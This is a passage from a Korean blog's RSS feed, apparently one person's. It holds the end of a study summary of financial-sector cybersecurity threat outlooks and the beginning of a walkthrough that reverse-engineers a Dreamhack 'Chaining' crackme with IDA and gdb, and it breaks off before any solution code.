          &lt;li&gt;사이버리스크 확산 방지를 위한 ‘레질리언스’, ‘유관 기관 간 긴밀한 협력 체계 구축’&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;제로 트러스트
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;클라우드 등 제3자 활용 증가 및 원격근무 장기화 → 보안위협도 심화&lt;/li&gt;
          &lt;li&gt;전통적 신뢰 경계가 사라짐&lt;/li&gt;
          &lt;li&gt;AI등 신기술 활용한 차세대 보안 솔루션 도입 확산&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응 전략
        &lt;ul&gt;
          &lt;li&gt;강력한 인증 기반의 제로 트러스트 전략
            &lt;ul&gt;
              &lt;li&gt;기존 워크로드에 대한 상세 분석, 고위험 업무에 필요한 통제 식별&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;성숙한 조직과 절차로 기술 도입의 득실을 철저히 판단&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;데이터 산업 경쟁
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;데이터 독점, 개인정보 통제, 데이터 소외계층 등의 양극화 이슈&lt;/li&gt;
          &lt;li&gt;공정 경쟁 저해 및 소비자 부담 증가의 우려&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응 전략
        &lt;ul&gt;
          &lt;li&gt;데이터 표준화 및 가치평가의 중요성 강조&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-2&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;업무 자동화 리스크
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;초자동화 기술: AI등의 발전으로 고차원적 업무까지 자동화가 진행되면서 업무 효율성과 정확성 극대화&lt;/li&gt;
          &lt;li&gt;새로운 문제점 제기
            &lt;ul&gt;
              &lt;li&gt;예상하지 못한 자동화 오류&lt;/li&gt;
              &lt;li&gt;시스템 복잡도 상승에 따른 취약점 증가&lt;/li&gt;
              &lt;li&gt;지속적인 관리 실패&lt;/li&gt;
              &lt;li&gt;대안 부제&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응 전략
        &lt;ul&gt;
          &lt;li&gt;인력 소비가 크거나 인적 실수가 자주 발생하는 분야 관련해서 업무 자동화 확대 예상&lt;/li&gt;
          &lt;li&gt;위험 요소를 사전에 분석해 차단 하고 안전하게 활용 해야 함&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-2&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;디지털 전환과 새로운 금융보안 규제
    &lt;ul&gt;
      &lt;li&gt;이건 법 개정안 발의 관련한 내용인데, 반영 안 됐고 오히려 전자금융거래법 개정안은 머지포인트 사태 + 공인인증서 폐지가 쟁점이 됐음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;오픈소스 리스크
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;다양한 산업 분야에서 오픈소스를 적극 활용 중
            &lt;ul&gt;
              &lt;li&gt;새로운 기술의 활용, 신속하고 효율적인 개발 목적&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;오픈소스는 누구나 접근, 수정이 가능
            &lt;ul&gt;
              &lt;li&gt;공격자가 임의로 악의적 코드 추가할 가능성&lt;/li&gt;
              &lt;li&gt;공개된 소스 코드에서 취약점을 찾아내 악용할 가능성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;라이선스 체계가 엄연히 존재&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응
        &lt;ul&gt;
          &lt;li&gt;다각적 노력 필요
            &lt;ul&gt;
              &lt;li&gt;오픈소스 활용 정책 및 절차 수립&lt;/li&gt;
              &lt;li&gt;오픈소스 보안대책 고려 필요&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;라이선스에 대한 정확한 인식 필요
            &lt;ul&gt;
              &lt;li&gt;오픈소스 분석 점검 서비스 등을 이용(라이선스와 취약점을 일괄 분석)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;제3자 리스크와 운영복원력
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;금융안정성 저해: 금융 디지털 전환으로 인한 관리 대상 사이버리스크의 범위 확대, 사이버공격의 고도화. 또한 금융시스템 참여자 간 연계가 복잡해지며 금융 보안 리스크의 확산가능성 증대&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응
        &lt;ul&gt;
          &lt;li&gt;운영복원력 확보, 제3자 리스크 관리가 쟁점이 됨
            &lt;ul&gt;
              &lt;li&gt;운영복원력: 위기 상황에서도 중요 금융기능이 영향 허용한도 내에서 유지되도록 하는 역량&lt;/li&gt;
              &lt;li&gt;제3자 리스크: 클라우드 이용 확대, 핀테크 기업과의 연계 증가. 주요 제3자와 관련해서는 보안리스크 + 집중 리스크(수탁사가 독점 가까이 하고 있어서 거기가 마비될 경우 파급력이 큼) + 종속 리스크(수탁사에게 크게 의존하고 있어 수탁사의 리스크가 위탁사에게 전이되거나 변화비용이 큼)까지 관리 필요, 출구 전략 필요.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;디지털자산의 확산
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;디지털 자산의 확대
            &lt;ul&gt;
              &lt;li&gt;이로 인해 DeFI 등장(디지털자산 간 경제활동 서비스 플랫폼)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;그러나 디지털 자산 관련 다양한 보안위협의 존재
            &lt;ul&gt;
              &lt;li&gt;익명성 보장 수준에 따른 범죄 악용 가능성&lt;/li&gt;
              &lt;li&gt;CBDC의 프라이버시 이슈&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응
        &lt;ul&gt;
          &lt;li&gt;디지털자산의 특성과 용도 등에 따른 적절한 보안대책을 세울 것
            &lt;ul&gt;
              &lt;li&gt;블록체인 기술 적용 시 코드 감사 등을 통한 스마트컨트랙트의 취약점 최소화&lt;/li&gt;
              &lt;li&gt;피해보상체계 구축&lt;/li&gt;
              &lt;li&gt;디지털자산 개발자, 제공자의 책임소재 명확화&lt;/li&gt;
              &lt;li&gt;금융서비스 중단 방지를 위한 운영복원력 확보 등&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;2023년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2023년 디지털금융 및 사이버보안 이슈 전망&lt;/h2&gt;

&lt;h3 id=&quot;3개년-동안-지속된-금융사이버보안-위협-3&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;랜섬웨어, 피싱 앱의 진화
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;랜섬웨어 공격의 증가
            &lt;ul&gt;
              &lt;li&gt;RaaS의 보편화, 핵티비즘의 증가&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보이스피싱 악성 앱의 강화&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응 전략
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;제로 트러스트&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/posts/finIssue/Untitled.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;마이플랫폼 시대, 데이터 확보와 보호&lt;/li&gt;
  &lt;li&gt;클라우드와 보안 고려사항
    &lt;ol&gt;
      &lt;li&gt;디지털 전환을 위해 보다 유연한 인프라 운용이 가능한 클라우드 이용을 적극 검토&lt;/li&gt;
      &lt;li&gt;클라우드 보안 사고 대부분이 기술적인 문제보다는 관리 미흡에서 비롯&lt;/li&gt;
      &lt;li&gt;통합 모니터링 및 관리 기능을 적극 사용해야!&lt;/li&gt;
      &lt;li&gt;보안 리스크 + 집중 리스크 + 종속 리스크의 우려. 출구 전략 필요&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-3&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;디지털 신원증명 활용&lt;/li&gt;
  &lt;li&gt;인공지능 활용, 공정성 보안성 확보를 통한 이용자 보호
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;금융권 전선, 중선, 후선 업무를 통틀어 AI 활용
            &lt;ul&gt;
              &lt;li&gt;사이버 보안 및 이상금융거래 탐지에서 AI를 적용해 고도화&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;금융위의 금융분야 AI 활용 활성화 및 신뢰확보 방안 발표&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/posts/finIssue/Untitled%201.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

            &lt;ul&gt;
              &lt;li&gt;빅데이터 확보
                &lt;ul&gt;
                  &lt;li&gt;금융회사 AI 데이터 라이브러리 구축&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;보안 위험 요소 제거
                &lt;ul&gt;
                  &lt;li&gt;금융분야 AI 보안성 검증체계 구축 및 운영&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응책
        &lt;ul&gt;
          &lt;li&gt;금융권 내 안전한 AI 활용 및 도입의 기반 마련 전망
            &lt;ul&gt;
              &lt;li&gt;데이터 결합 후 재사용 허용, 공동 AI 데이터셋 구축 및 합성 데이터 기술(실제 데이터와 통계적 특성이 유사하여 실제 데이터를 분석한 결과와 유사한 결과를 얻을 수 있도록 인공적으로 재현하여 생성한 가상 데이터)&lt;/li&gt;
              &lt;li&gt;XAI 기준 마련 → AI 의사결정 과정에 대한 신뢰성 확보&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공정성, 신뢰성 확보를 통한 이용자 보호의 필요성&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;금융보안 규제 합리화, 전제되는 자율 보안&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-3&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;디지털자산의 확산에 따른 리스크 관리 체계 필요성&lt;/li&gt;
  &lt;li&gt;오픈소스 활성화에 따르는 공급망 보안 필요성&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sat, 04 Nov 2023 23:05:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/financial</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/financial</guid>
      </item>
    
      <item>
        <title>Dreamhack-Reversing-Chaining 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#dreamhack-chaining-문제-풀이&quot; id=&quot;markdown-toc-dreamhack-chaining-문제-풀이&quot;&gt;Dreamhack Chaining 문제 풀이&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0-바이너리-포맷-분석&quot; id=&quot;markdown-toc-0-바이너리-포맷-분석&quot;&gt;0. 바이너리 포맷 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-파일에-적용된-보호-기법-및-엔트리-확인&quot; id=&quot;markdown-toc-01-파일에-적용된-보호-기법-및-엔트리-확인&quot;&gt;0.1. 파일에 적용된 보호 기법 및 엔트리 확인&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-엔트리의-함수-확인&quot; id=&quot;markdown-toc-02-엔트리의-함수-확인&quot;&gt;0.2. 엔트리의 함수 확인&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-행위기반-정적-디버깅&quot; id=&quot;markdown-toc-1-행위기반-정적-디버깅&quot;&gt;1. 행위기반 정적 디버깅&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-동적-디버깅&quot; id=&quot;markdown-toc-2-동적-디버깅&quot;&gt;2. 동적 디버깅&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-main-이후-실행되는-함수-sub_34d7&quot; id=&quot;markdown-toc-21-main-이후-실행되는-함수-sub_34d7&quot;&gt;2.1. main 이후 실행되는 함수: sub_34D7&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-sub_19c4-내부에서-password-를-출력하는-부분-체크&quot; id=&quot;markdown-toc-22-sub_19c4-내부에서-password-를-출력하는-부분-체크&quot;&gt;2.2. sub_19C4 내부에서 password: 를 출력하는 부분 체크&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-sub_1447-분석&quot; id=&quot;markdown-toc-23-sub_1447-분석&quot;&gt;2.3. sub_1447 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-sub_14ed-분석&quot; id=&quot;markdown-toc-24-sub_14ed-분석&quot;&gt;2.4. sub_14ed 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#25-sub_15bb-분석&quot; id=&quot;markdown-toc-25-sub_15bb-분석&quot;&gt;2.5. sub_15bb 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#251-sub_1545-for-4k-4k2-elements&quot; id=&quot;markdown-toc-251-sub_1545-for-4k-4k2-elements&quot;&gt;2.5.1. sub_1545 (for 4k, 4k+2 elements)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#252-sub_1580-for-4k1-4k3-elements&quot; id=&quot;markdown-toc-252-sub_1580-for-4k1-4k3-elements&quot;&gt;2.5.2 sub_1580 (for 4k+1, 4k+3 elements)&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#26-sub_16e0-분석&quot; id=&quot;markdown-toc-26-sub_16e0-분석&quot;&gt;2.6. sub_16e0 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#27-sub_172e-분석&quot; id=&quot;markdown-toc-27-sub_172e-분석&quot;&gt;2.7. sub_172e 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#28-sub_193c-분석&quot; id=&quot;markdown-toc-28-sub_193c-분석&quot;&gt;2.8. sub_193c 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-복호화-프로그램-만들기&quot; id=&quot;markdown-toc-3-복호화-프로그램-만들기&quot;&gt;3. 복호화 프로그램 만들기&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-sub_1215-does-xor-every-char-in-user-input-with-0x44&quot; id=&quot;markdown-toc-31-sub_1215-does-xor-every-char-in-user-input-with-0x44&quot;&gt;3.1. sub_1215: does xor every char in user input with 0x44&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#32-sub_1268-make-a-permutation-table&quot; id=&quot;markdown-toc-32-sub_1268-make-a-permutation-table&quot;&gt;3.2. sub_1268: make a permutation table&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#33-sub_1447-does-permutation-on-user-inputbuf&quot; id=&quot;markdown-toc-33-sub_1447-does-permutation-on-user-inputbuf&quot;&gt;3.3. sub_1447: Does Permutation on user input(buf)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#34-sub_14ed--table의-1-byte를-buf의-1byte와-xor해-buf에-저장한다&quot; id=&quot;markdown-toc-34-sub_14ed--table의-1-byte를-buf의-1byte와-xor해-buf에-저장한다&quot;&gt;3.4. sub_14ed:  table의 1 byte를 buf의 1byte와 xor해 buf에 저장한다.&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#35-sub_15bb-buf에서-4k-4k1-4k2-4k3-k0-1---15-번째의-원소별로-다른-알고리즘을-적용해-변환한다-즉-substitution-연산을-한다&quot; id=&quot;markdown-toc-35-sub_15bb-buf에서-4k-4k1-4k2-4k3-k0-1---15-번째의-원소별로-다른-알고리즘을-적용해-변환한다-즉-substitution-연산을-한다&quot;&gt;3.5. sub_15bb: buf에서 4k, 4k+1, 4k+2, 4k+3 (k=0, 1, … , 15) 번째의 원소별로 다른 알고리즘을 적용해 변환한다. 즉 substitution 연산을 한다.&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#351-sub_1545-우로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k-4k2&quot; id=&quot;markdown-toc-351-sub_1545-우로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k-4k2&quot;&gt;3.5.1. sub_1545: 우로 n비트 순환 시프트 연산을 수행하는 함수다. (for 4k, 4k+2)&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#352-sub_1580-좌로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k1-4k3&quot; id=&quot;markdown-toc-352-sub_1580-좌로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k1-4k3&quot;&gt;3.5.2. sub_1580: 좌로 n비트 순환 시프트 연산을 수행하는 함수다. (for 4k+1, 4k+3)&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#36-sub_16e0-카이사르-치환-암호화&quot; id=&quot;markdown-toc-36-sub_16e0-카이사르-치환-암호화&quot;&gt;3.6. sub_16e0: 카이사르 치환 암호화&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#37-sub_172e&quot; id=&quot;markdown-toc-37-sub_172e&quot;&gt;3.7. sub_172e&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#38-sub_193c-여긴-정답-배열과-input-배열을-대조하는-루틴이다&quot; id=&quot;markdown-toc-38-sub_193c-여긴-정답-배열과-input-배열을-대조하는-루틴이다&quot;&gt;3.8. sub_193c: 여긴 정답 배열과 input 배열을 대조하는 루틴이다.&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-구현-및-결과&quot; id=&quot;markdown-toc-4-구현-및-결과&quot;&gt;4. 구현 및 결과&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dreamhack-chaining-문제-풀이&quot;&gt;Dreamhack Chaining 문제 풀이&lt;/h1&gt;

&lt;p&gt;주어진 바이너리를 실행해 보면 아래와 같은 화면이 출력된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Password로 알맞은 값을 줘야 pass가 뜰 것이고, 그건 플래그값이 될 것이다.&lt;/p&gt;

&lt;p&gt;일단 바이너리의 data섹션에 저장된 string을 불러오는 부분이 있을 것이고, 해당 스트링을 띄우는 함수 내부에서 input값이 올바른 값인지 체크하는 부분이 있을 것임을 유추할 수 있다.&lt;/p&gt;

&lt;h1 id=&quot;0-바이너리-포맷-분석&quot;&gt;0. 바이너리 포맷 분석&lt;/h1&gt;

&lt;h2 id=&quot;01-파일에-적용된-보호-기법-및-엔트리-확인&quot;&gt;0.1. 파일에 적용된 보호 기법 및 엔트리 확인&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%201.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;해당 파일에는 모든 보호 조치가 적용되어 있고, PIE(바이너리가 업로드되는 메모리 영역이 매번 달라져서 plt나 got 접근을 통해 라이브러리 함수의 절대 주소를 알아내는 기법을 차단함)및 Full RELRO(got overwrite를 차단함)가 적용되어 있다.&lt;/li&gt;
  &lt;li&gt;또한 Stripped되어 있어 함수나 변수 등의 심볼이 전부 없어져 있다.&lt;/li&gt;
  &lt;li&gt;이런 경우, 함수의 엔트리가 어디인지 알아내야 이후 리버싱이 편하다. readelf로 헤더 정보를 읽어낸 결과, 엔트리 오프셋은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10a0&lt;/code&gt;임을 확인했다.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;02-엔트리의-함수-확인&quot;&gt;0.2. 엔트리의 함수 확인&lt;/h2&gt;

&lt;p&gt;IDA를 사용해 엔트리에 어떤 함수가 정의되어 있는지 확인한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%202.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;start로 정의되어 있고, 내부에서 libc_start_main을 콜함을 확인했다. 이 함수의 첫 번째 인자인 rdi에 들어간 주소가 main함수의 주소이므로, main을 찾아낼 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%203.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main의 내부에서는 sub_34D7을 콜함을 확인했다.&lt;/p&gt;

&lt;p&gt;그런데 조금 이상하다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_34D7(rbp+var_18, rbp+var_10), var_18과 var_10은 모두 특정 ptr과 관련 있음&lt;/code&gt;은 대체 무슨 뜻인지 모르겠기 때문이다… 심지어 저 ptr이 뭔지도 알 수 없다. 따라서 gdb를 붙여서 직접 어떤 인자가 들어가는지 확인해 보려 한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%204.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;일단 엔트리 상에서 메인함수를 콜하는 부분을 찾았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%205.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그리고 메인함수를 보니 IDA로 찾았던 메인함수의 인스트럭션과 일치함을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;아하! IDA에서 보였던 ptr 변수는 main 스택프레임의 rbp였다. 해당 바이너리가 stripped되었기 때문에 생긴 현상으로 보인다.&lt;/p&gt;

&lt;h1 id=&quot;1-행위기반-정적-디버깅&quot;&gt;1. 행위기반 정적 디버깅&lt;/h1&gt;

&lt;p&gt;일단 여기까지 하고, 앞서 추측했던 점-내부에 저장된 문자열이 출력되는 함수와 사용자 입력값 verification 부분이 밀접할 것이라는 점-이 맞는지 확인해 보기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%206.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아마 good:) 부분이 올바른 코드 플로우겠지&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%207.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;xref lookup을 이용해 해당 문자열을 참조하는 코드섹션으로 이동했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%208.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 문자열을 출력하는 기능을 발견했고, 함수가 정의되어 있지 않아 함수로 정의해 주었다.&lt;/p&gt;

&lt;p&gt;여기에서부터 문제를 푸는 방법을 고려해 보았으나, 다 stripped되어 있으므로 역으로 따라가는 것은 힘들어 보인다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt; 를 출력하는 부분부터 순차적으로 따라가 보기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_19C4&lt;/code&gt;에서 시작하는 함수에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt; 문자열을 참조하고 있음을 확인했지만, 정작 프린트하는 함수는 없어 보인다.&lt;/p&gt;

&lt;p&gt;애초에 해당 함수는 굉장히 이상해 보이는데, 이유는 아래와 같다.&lt;/p&gt;

&lt;p&gt;첫째, 분명히 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt; 문자열을 가져와 사용하는데 이걸 pseudo-function으로 바꿔 보면 그런 부분이 전혀 보이지 않는다. 즉 IDA가 인지할 수 없는 형태로 코드가 짜여져 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%209.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;둘째, 이전의 문자열 출력 함수들에서 주로 보였던 puts 등의 출력 함수를 콜하는 부분이 보이지 않는다. 실제로 pwndbg의 rop를 이용해 찾은 call 가젯 중 오프셋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x193C&lt;/code&gt;이상 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x34CE&lt;/code&gt; (0x00005555555559C4~0x00005555555574CE) 범위에 해당되는 것은 없었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2010.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;셋째. 그렇다면 상기 조건을 모두 충족할 때, 여기에서 syscall write on console이 가능한 이유는 뭘까? 사실 당장은 모르겠다.&lt;/p&gt;

&lt;p&gt;일단 접근법을 결정해 보자. 현재 목표는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;good:)&lt;/code&gt;를 출력하기 전에, 사용자 입력값 verification 과정을 찾아내는 것이다. 이를 위해 역순으로 접근했으나 함수 간의 연결성이 확보되지 않아 스트링을 근거로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt; 를 출력하는 부분부터 찾아 이후 함수의 행위를 확인함으로써 함수 간의 연결성을 확보하려는 시도 중이다.&lt;/p&gt;

&lt;p&gt;이를 위해 첫째, syscall이 수행되기 위해 필수적인 가젯을 찾아본다. 둘째, 동적으로 디버깅하며 syscall write가 수행되는 지점에 bp를 건다. 두 가지 접근이 가능하다.&lt;/p&gt;

&lt;p&gt;단, 현재 문제를 푸는 과정이므로 두 번째 방식으로 접근해 빠르게 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password:&lt;/code&gt;를 출력하는 부분을 찾고 이후 어떤 함수가 실행되는지 체크해야 한다.&lt;/p&gt;

